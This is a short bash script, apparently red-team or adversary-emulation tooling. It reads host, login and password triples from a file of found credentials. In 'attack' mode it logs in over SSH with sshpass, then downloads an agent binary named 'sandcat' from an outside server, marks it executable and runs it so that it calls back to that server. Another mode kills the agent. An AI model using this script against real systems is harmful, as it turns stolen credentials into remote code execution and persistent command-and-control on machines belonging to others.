#!/bin/bash

while read -r line; do 
   if [ -n "${line}" ]; then 
      l=(${line})
      host=${l[0]} 
      login=${l[1]} 
      password=${l[2]} 
   fi
done < foundCredential.txt

if [[ $1 = "attack" ]]; then
    sshpass -p $password ssh $login@$host "curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' http://$2/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server http://$2 -group $3 &;"
    echo "sandcat started"
else 
    sshpass -p $password ssh -o ConnectTimeout=3 $login@$host '(pkill -f sandcat)'
    echo "sandcat stopped"
fi
